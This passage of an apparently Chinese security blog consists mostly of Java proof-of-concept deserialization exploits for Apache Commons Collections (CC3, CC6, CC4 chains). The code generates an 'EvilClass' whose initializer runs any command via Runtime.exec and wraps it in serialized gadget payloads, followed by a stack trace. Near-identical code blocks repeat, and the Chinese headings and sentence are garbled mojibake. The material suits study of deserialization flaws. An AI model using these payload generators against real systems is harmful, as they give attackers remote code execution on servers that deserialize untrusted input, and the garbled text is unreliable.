pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="CC6ï¼ˆCC3-CC4ï¼‰"><a href="#CC6ï¼ˆCC3-CC4ï¼‰" class="headerlink" title="CC6ï¼ˆCC3&#x2F;CC4ï¼‰"></a>CC6ï¼ˆCC3&#x2F;CC4ï¼‰</h5><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, TrAXFilter.class);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap, <span class="string">&quot;factory&quot;</span>, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> triggerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, TrAXFilter.class);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap, <span class="string">&quot;factory&quot;</span>, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> triggerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:64)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:422)</span><br><span class="line">at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:116)</span><br><span class="line">at org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)</span><br><span class="line">at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)</span><br><span class="line">at java.util.PriorityQueue.siftDown(PriorityQueue.java:687)</span><br><span class="line">at java.util.PriorityQueue.heapify(PriorityQueue.java:736)</span><br><span class="line">at java.util.PriorityQueue.readObject(PriorityQueue.java:795)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆCC2-TrAXFilterï¼‰"><a href="#åŸç†åˆ†æï¼ˆCC2-TrAXFilterï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆCC2+TrAXFilterï¼‰"></a>åŸç†åˆ†æï¼ˆCC2+TrAXFilterï¼‰</h4><p>åœ¨ CC2 çš„åŸºç¡€ä¸Šå€ŸåŠ© <code>TrAXFilter</code>+<code>TemplatesImpl</code> åŠ è½½å­—èŠ‚ç ç»•è¿‡å¯¹ <code>InvokerTransformer</code> çš„è¿‡æ»¤ã€‚</p>
